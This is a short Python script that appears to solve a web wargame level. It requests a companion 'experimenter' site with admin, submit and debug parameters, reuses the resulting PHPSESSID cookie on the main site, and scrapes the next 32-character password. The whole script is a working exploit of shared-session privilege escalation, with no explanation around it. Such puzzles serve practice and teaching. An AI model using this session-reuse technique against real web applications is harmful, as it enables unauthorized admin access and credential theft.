import config
import os, re
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)
exp_url = "http://{}-experimenter.{}".format(user, config.url)

response = get(exp_url, auth=(user, password), params={"admin" : 1, "submit" : 1, "debug" : 1})
response = get(url, auth=(user, password), cookies={ "PHPSESSID" : response.cookies["PHPSESSID"] })

password = re.findall(r"\w{32}", response.content)[-1]

print(password)